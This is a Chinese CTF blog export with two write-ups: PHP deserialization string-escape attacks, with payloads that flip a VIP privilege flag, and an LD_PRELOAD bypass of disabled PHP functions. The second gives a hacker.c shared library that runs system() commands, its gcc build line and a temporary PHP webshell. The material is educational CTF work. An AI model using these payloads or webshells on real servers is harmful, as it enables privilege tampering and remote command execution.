<p>可以看到第二段多出来一个d，这就是溢出的字符，那么我们污染v2的值为666，就要构造”;s:2:”v2”;s:3:”666”;}这段序列化的字段，字符长度为22，既然ls替换成pwd会添加一个字符，那么我们添加22个ls就可以多溢出22个字符，类似这样子：<br>O:1:”A”:2:{s:2:”v1”;s:66:”lslslslslslslslslslslslslslslslslslslslslsls”;s:2:”v2”;s:3:”666”;}”;s:2:”v2”;s:3:”123”;}<br>变成了<br>O:1:”A”:2:{s:2:”v1”;s:66:”pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd”;s:2:”v2”;s:3:”666”;}”;s:2:”v2”;s:3:”123”;}</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v2&quot;;s:3:&quot;666&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v2&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309211742804.png"><br>红色的”;s:2:”v2”;s:3:”666”;}就是我们构造的污染语句，我们把它反序列化一下看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>#1 (2) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v1</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">66</span>) <span class="string">&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v2</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;666&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>字符串增加的情况下必须要和<br>可以看到正常的反序列化，把我们的字符正常解析了，字符串增加的原理大概是这样子，例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin666&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">/*echo  $a_seri;</span></span><br><span class="line"><span class="comment">echo  &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">$a_seri_filter = filter($a_seri);</span></span><br><span class="line"><span class="comment">echo  $a_seri_filter;</span></span><br><span class="line"><span class="comment">echo  &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">$a_seri_filter_unseri = unserialize($a_seri_filter);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var_dump($a_seri_filter_unseri);*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>假如我们要污染isvip的值，该怎么做？<br>先来看看序列化的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>正常思路就是把后面的”;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:0;}字符溢出，变成”;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:1;}<br>一共47个字符，admin替换成admin666增加了3个字符，怎么溢出47个字符，这里可以考虑一个思路：<br>随便把password的值也改变了，多出来一个字符，48除于3刚刚好16个admin，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin666&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:7:&quot;1234567&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:128:&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:7:&quot;1234567&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:128:&quot;admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666&quot;;s:8:&quot;password&quot;;s:7:&quot;1234567&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="comment">/*class user#2 (3) &#123;</span></span><br><span class="line"><span class="comment">  public $username =&gt;</span></span><br><span class="line"><span class="comment">  string(128) &quot;admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666admin666&quot;</span></span><br><span class="line"><span class="comment">  public $password =&gt;</span></span><br><span class="line"><span class="comment">  string(7) &quot;1234567&quot;</span></span><br><span class="line"><span class="comment">  public $isVIP =&gt;</span></span><br><span class="line"><span class="comment">  int(1)</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们直接把要溢出的字符串补齐一个字符就是把password的值变成了1234567，多了一位，这样子就可以污染isvip的值，但是password的值被修改了，这是一个思路，如果题目鉴权只对isvip进行检查可以尝试这个思路。</p>
<h2 id="2-字符串被替换变少了导致字符串逃逸"><a href="#2-字符串被替换变少了导致字符串逃逸" class="headerlink" title="2.字符串被替换变少了导致字符串逃逸"></a>2.字符串被替换变少了导致字符串逃逸</h2><p>先来看看一个有意思的特性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ABC</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;O:3:&quot;ABC&quot;:1:&#123;s:2:&quot;v2&quot;;s:4:&quot;abcd&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;ABC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span>#1 (2) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v1</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v2</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;abcd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么明明是反序列化$b，会出现v1的值，这是因为O:3:”ABC”告诉了php在ABC这个类里面获取所有的成员，然后再把$b添加进去，类似覆盖但是保留了没被修改的成员。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;abc.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样是污染vip的值：<br>拆解一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;hk&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到s:4:”后面的四个字符都是被当作字符串处理了于是反序列化会报错。<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309211745201.png"></p>
<p>主要还是吃掉中间的字符”;s:4:”pass”;s:xx:”一个19个字符，需要构造10个flag，每次吃掉两个，一共被吃掉20个字符，所以在”;s:4:”pass”;s:xx:”前面加上一个字符1，刚刚好变成了需要吃掉1”;s:4:”pass”;s:xx:”一共20个字符，为什么是xx，因为后面的字符串长度肯定是超过10的，构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span> = <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$param</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:40:&quot;flagflagflagflagflagflagflagflagflagflag&quot;;s:4:&quot;pass&quot;;s:42:&quot;1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;&quot;;s:3:&quot;vip&quot;;b:0;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:40:&quot;hkhkhkhkhkhkhkhkhkhk&quot;;s:4:&quot;pass&quot;;s:42:&quot;1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;&quot;;s:3:&quot;vip&quot;;b:0;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  class test#1 (3) &#123;</span></span><br><span class="line"><span class="comment">  public $user =&gt;</span></span><br><span class="line"><span class="comment">  string(40) &quot;hkhkhkhkhkhkhkhkhkhk&quot;;s:4:&quot;pass&quot;;s:42:&quot;1&quot;</span></span><br><span class="line"><span class="comment">  public $pass =&gt;</span></span><br><span class="line"><span class="comment">  string(6) &quot;benben&quot;</span></span><br><span class="line"><span class="comment">  public $vip =&gt;</span></span><br><span class="line"><span class="comment">  bool(true)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;abc.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>环境变量注入</title>
    <url>/2024/01/02/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="假设拿到了一个shell但无法执行系统命令"><a href="#假设拿到了一个shell但无法执行系统命令" class="headerlink" title="假设拿到了一个shell但无法执行系统命令"></a>假设拿到了一个shell但无法执行系统命令</h3><p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202401031529213.png"></p>
<p>这是一个空壳shell，可以通过上传<code>LD_PRELOAD</code>​进行绕过，怎么判断要覆写的函数名？</p>
<p>可以通过看sh会调用的库函数</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">└─$ sudo readelf -Ws <span class="regexp">/usr/</span>bin/sh</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>挑一个geteuid</p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202401031529215.png"></p>
<p>hacker.c</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成.so文件，</p>
<blockquote>
<p>就是将一系列的c函数打包到一个文件中，方便其他二进制文件调用，这样的文件就是so文件，也称动态链接库，相当于windows中的dll文件。</p>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hacker.c -o hacker.so</span><br></pre></td></tr></table></figure>

<p>上传so文件到有写入权限的目录下，权限也很玄乎，假如shell写入权限不够就很难利用了，参考羊城杯2023的ez_web，上传目录居然是etc，也考倒了很多</p>
<p>写入临时webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/hacker.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问临时webshell即可成功执行system命令</p>
<p>当然hacker.c也可以这样子写</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmd = <span class="built_in">getenv</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>临时webshelll</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;CMD=ls&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./hacker.so&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="​​假如没有上传点也没有利用点该怎么触发命令执行​"><a href="#​​假如没有上传点也没有利用点该怎么触发命令执行​" class="headerlink" title="​​假如没有上传点也没有利用点该怎么触发命令执行​"></a>​​假如没有上传点也没有利用点该怎么触发命令执行​</h3><p>如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... 一些其他代码</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>怎么触发命令执行？</p>
<p>php的system是调用的sh，在centos系统中sh指向bash，在p神的文章中也对比了dash的利用，虽然很鸡肋但是最后还是发现bash可以利用，是因为variables.c的<code>initialize_shell_variables</code>​函数用于将环境变量注册成SHELL的变量</p>
